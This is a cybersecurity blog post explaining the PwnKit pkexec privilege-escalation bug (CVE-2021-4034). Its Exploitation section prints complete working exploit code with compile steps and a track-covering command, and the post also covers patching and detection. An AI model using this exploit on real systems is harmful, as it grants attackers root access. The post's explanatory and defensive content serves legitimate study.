<!DOCTYPE html>







<html lang="en"
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Explanation of CVE-2021-4034 a.k.a. Pwnkit" />
<meta property="og:locale" content="en" />
<meta name="description" content="On January 25, 2022, security researchers at Qualys labs disclosed a Local Privilege Escalation vulnerability in Linux within Polkit’s pkexec component. Listed as CVE-2021-4034 and given a high severity rating of 7.8 out of 10, this vulnerability affects many Linux distributions including Ubuntu, Debian, Fedora, and CentOS. A proof of concept (POC) wasn’t submitted by Qualys along with their disclosure, but amazingly people started to create and upload their own POCs just hours of the announcement. At the time, I myself saw some POCs being uploaded to Github." />
<meta property="og:description" content="On January 25, 2022, security researchers at Qualys labs disclosed a Local Privilege Escalation vulnerability in Linux within Polkit’s pkexec component. Listed as CVE-2021-4034 and given a high severity rating of 7.8 out of 10, this vulnerability affects many Linux distributions including Ubuntu, Debian, Fedora, and CentOS. A proof of concept (POC) wasn’t submitted by Qualys along with their disclosure, but amazingly people started to create and upload their own POCs just hours of the announcement. At the time, I myself saw some POCs being uploaded to Github." />
<link rel="canonical" href="https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/" />
<meta property="og:url" content="https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/" />
<meta property="og:site_name" content="angry-byte.com" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-02-07T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Explanation of CVE-2021-4034 a.k.a. Pwnkit" />
<meta name="twitter:site" content="@angry_byte" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-07T00:00:00+08:00","datePublished":"2022-02-07T00:00:00+08:00","description":"On January 25, 2022, security researchers at Qualys labs disclosed a Local Privilege Escalation vulnerability in Linux within Polkit’s pkexec component. Listed as CVE-2021-4034 and given a high severity rating of 7.8 out of 10, this vulnerability affects many Linux distributions including Ubuntu, Debian, Fedora, and CentOS. A proof of concept (POC) wasn’t submitted by Qualys along with their disclosure, but amazingly people started to create and upload their own POCs just hours of the announcement. At the time, I myself saw some POCs being uploaded to Github.","headline":"Explanation of CVE-2021-4034 a.k.a. Pwnkit","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/"},"url":"https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Explanation of CVE-2021-4034 a.k.a. Pwnkit | angry-byte.com
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="angry-byte.com">
<meta name="application-name" content="angry-byte.com">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  

  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
          
          <img src="/assets/images/logo.png" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">angry-byte.com</a>
    </div>
    <div class="site-subtitle font-italic">A cybersecurity blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw  ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/angry-byte" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/angry_byte" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['contact','angry-byte.com'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Explanation of CVE-2021-4034 a.k.a. Pwnkit</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        



<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      
      

      

    
      

      
      

      
      
      
      

      

    
      

      
      

      
      
      
      

      

    
      

      
      

      
      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- return -->







<h1 data-toc-skip>Explanation of CVE-2021-4034 a.k.a. Pwnkit</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>
    
    

    

    By
    <em>
      
        <a href="https://twitter.com/angry_byte">AngryByte</a>
      
    </em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago"
    date="2022-02-07 00:00:00 +0800"
    
      data-toggle="tooltip"
      data-placement="bottom"
      title="Mon, Feb  7, 2022, 12:00 AM +0800"
    >Feb  7</em>

      </span>

      <!-- lastmod date -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="899 words">
  <em>4 min</em> read</span>


      <!-- page views -->
      
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>On January 25, 2022, security researchers at Qualys labs <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">disclosed a Local Privilege Escalation vulnerability in Linux within Polkit’s pkexec component</a>. Listed as CVE-2021-4034 and given a high severity rating of 7.8 out of 10, this vulnerability affects many Linux distributions including Ubuntu, Debian, Fedora, and CentOS. A proof of concept (POC) wasn’t submitted by Qualys along with their disclosure, but amazingly people started to create and upload their own POCs just hours of the announcement. At the time, I myself saw some POCs being uploaded to Github.</p>

<h2 id="what-is-polkit-and-pkexec">What is Polkit and pkexec?<a href="#what-is-polkit-and-pkexec" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Polkit is a program used in Linux to handle authorisation policies and determine if you have proper permissions. Pkexec, which is a component of Polkit, is a SUID-root program that allows one to execute commands as another user. If no user is specified, then Pkexec will use the root user as the default.</p>

<p>In other words, the policy toolkit is like an alternative to the sudo command that most Linux users are familiar with. If you were to run a command such as <code class="language-plaintext highlighter-rouge">pkexec whoami</code>, you would be prompted for a password and then when entered, the output of the command would be “root”.</p>

<h2 id="how-it-works">How it Works<a href="#how-it-works" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Director of Vulnerability and Threat Research at Qualys, Bharat Jogi, explains PwnKit as “a memory corruption vulnerability in Polkit, which allows any unprivileged user to gain full root privileges on a vulnerable system using default polkit configuration”.</p>

<p>While the vulnerability won’t give initial system access to an attacker, it’s still a significant vulnerablity for a couple of reasons:</p>
<ol>
  <li>The vulnerability would give an attacker full control of a Linux system</li>
  <li>It has existed for 12 years ever since Policy Kit’s first release in 2009 and so any unpatched Linux systems in that timeline is vulnerable</li>
  <li>It is easy to exploit</li>
</ol>

<p>The reason to why pkexec was vulnerable is because it mishandles command line arguments. In Linux C Programs, the first argument would be assigned to the name of the executable itself. However it is also possible to specify an empty list without the executable name and using the <em>execve</em> function to call the executable. In this case, the program would rely that the first argument to call the executable name which can lead to memory corruption vulnerabilities. What makes pkexec special is that it is SUID and has special file permissions that allow it to run as the original owner which is root. What pwnkit does is list no arguments to pkexec resulting in corrupted memory and allowing an attacker to obtain root privileges.</p>

<p>For a more detailed and technical explanation, see <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">Qualys’ blog post</a>.</p>

<h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>With just two small files and a couple of Linux commands, an attacker can exploit the vulnerability within a minute.</p>

<p>The first file we need is called evil-so.c which contains the code:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}
</pre></td></tr></tbody></table></code></div></div>

<p>The second file we need is called exploit.c which has the contents:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " &amp;&amp; chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' &gt; " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}
</pre></td></tr></tbody></table></code></div></div>

<p>To get these files onto the system, you can either copy and paste them into the target system into 2 different files with their respective names, use SCP if SSH is enabled, or use curl/wget to download the files online anywhere.</p>

<p>After you have the files on the system, execute the commands: <code class="language-plaintext highlighter-rouge">gcc -shared -o evil.so -fPIC evil-so.c</code> and then execute gcc again with <code class="language-plaintext highlighter-rouge">gcc exploit.c -o exploit</code> command. You can cover some of your tracks with <code class="language-plaintext highlighter-rouge">rm -r ./GCONV_PATH=. &amp;&amp; rm -r ./evildir &amp;&amp; rm exploit &amp;&amp; rm evil.so</code> or you can just execute the program with <code class="language-plaintext highlighter-rouge">./exploit</code> and then obtain root privilege.</p>

<p>If you’re looking to try and exploit the vulnerability, TryHackMe has released a <a href="https://tryhackme.com/room/pwnkit">room</a> in which you can play around with.</p>

<h2 id="solutions-and-mitigations">Solutions and Mitigations<a href="#solutions-and-mitigations" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>At the same time the vulnerability was disclosed, an update has been released for all Linux systems to patch the vulnerability. On Ubuntu and Debian systems, an update can be applied using <em>apt</em> with the <code class="language-plaintext highlighter-rouge">sudo apt update &amp;&amp; sudo apt upgrade -y</code> command. If for whatever reason, you can’t patch your system, Qualys recommends removing the SUID-bit from pkexec as a temporary mitigation. The command for that would be <code class="language-plaintext highlighter-rouge">sudo chmod 0755 /usr/bin/pkexec</code>.</p>

<p>If you think your system has been affected by the vulnerability, look at your logs and look for entries within the lines of <em>“The value for the SHELL variable was not found the /etc/shells file”</em> or <em>“The value for environment variable […] contains suspicious content.”</em> Unfortunately however there are many variations of Pwnkit in which some uses different environment variables and exploits the vulnerability in different ways. This means that some exploits will leave traces and be detected by logs and some will not.</p>

<h3 id="references">References<a href="#references" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><a href="https://www.bleepingcomputer.com/news/security/linux-system-service-bug-gives-root-on-all-major-distros-exploit-released/">https://www.bleepingcomputer.com/news/security/linux-system-service-bug-gives-root-on-all-major-distros-exploit-released/</a></p>

<p><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</a></p>

<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034</a></p>

<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4034">https://nvd.nist.gov/vuln/detail/CVE-2021-4034</a></p>

<p><a href="https://www.exploit-db.com/exploits/50689">https://www.exploit-db.com/exploits/50689</a></p>

<p><a href="https://www.schneier.com/blog/archives/2022/01/twelve-year-old-linux-vulnerability-discovered-and-patched.html">https://www.schneier.com/blog/archives/2022/01/twelve-year-old-linux-vulnerability-discovered-and-patched.html</a></p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/cybersecurity/'>Cybersecurity</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >Linux</a>
      
      <a href="/tags/vulnerabilities/"
          class="post-tag no-text-decoration" >Vulnerabilities</a>
      
      <a href="/tags/privilege-escalation/"
          class="post-tag no-text-decoration" >Privilege-Escalation</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Explanation of CVE-2021-4034 a.k.a. Pwnkit - angry-byte.com&url=https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Explanation of CVE-2021-4034 a.k.a. Pwnkit - angry-byte.com&u=https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Explanation of CVE-2021-4034 a.k.a. Pwnkit - angry-byte.com&url=https://www.angry-byte.com/posts/CVE-2021-4034-a.k.a.-Pwnkit-Explanation/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access">
      















      















  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">CTF</a>
    
      
      <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a>
    
      
      <a class="post-tag" href="/tags/vulnerabilities/">Vulnerabilities</a>
    
      
      <a class="post-tag" href="/tags/linux/">Linux</a>
    
      
      <a class="post-tag" href="/tags/network-attacks/">Network-Attacks</a>
    
      
      <a class="post-tag" href="/tags/privilege-escalation/">Privilege-Escalation</a>
    
      
      <a class="post-tag" href="/tags/sqli/">SQLi</a>
    
      
      <a class="post-tag" href="/tags/web-attacks/">Web-Attacks</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
      
        
        <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->




  
    
    
      
      
        
        
        
          





  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/THM-Lazy-Admin-Walkthrough/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2022-01-07 00:00:00 +0800"
    >Jan  7</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe Lazy Admin Walkthrough</h3>
            <div class="text-muted small">
              <p>
                





                Lazy Admin is a an easy CTF room on TryHackMe that will test one’s enumeration and linux skills.

Recon

After deploying the machine, I did a mandatory nmap scan to see what ports are open and what...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/THM-Vulnerability-Capstone/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2021-12-27 00:00:00 +0800"
    >Dec 27, 2021</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe Vulnerability Capstone Writeup</h3>
            <div class="text-muted small">
              <p>
                





                The THM room Vulnerability Capstone is a CTF room built to practice your vulnerability and exploit researching skills.

Recon

Once the machine has started, we do a quick mandatory nmap scan to see...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/THM-Gallery-Writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago small"
    date="2022-02-14 00:42:00 +0800"
    >Feb 14</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe Gallery Writeup</h3>
            <div class="text-muted small">
              <p>
                





                The THM room Gallery is an easy level CTF room created to test your skills in SQLi and exploiting known vulnerabilities.

Recon

Start with a simple port scan.



Here we can see that there are two...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


      
        
        <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/How-to-Hack-Your-Ex-Girlfriend's-Instagram-Account/" class="btn btn-outline-primary"
    prompt="Older">
    <p>How to Hack your Ex-girlfriend's Instagram Account</p>
  </a>
  

  
  <a href="/posts/THM-Gallery-Writeup/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>TryHackMe Gallery Writeup</p>
  </a>
  

</div>

      
        
        <!--  The comments switcher -->


      
    </div>
  </div>
</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/angry_byte">AngryByte</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/ctf/">CTF</a>
    
      
      <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a>
    
      
      <a class="post-tag" href="/tags/vulnerabilities/">Vulnerabilities</a>
    
      
      <a class="post-tag" href="/tags/linux/">Linux</a>
    
      
      <a class="post-tag" href="/tags/network-attacks/">Network-Attacks</a>
    
      
      <a class="post-tag" href="/tags/privilege-escalation/">Privilege-Escalation</a>
    
      
      <a class="post-tag" href="/tags/sqli/">SQLi</a>
    
      
      <a class="post-tag" href="/tags/web-attacks/">Web-Attacks</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

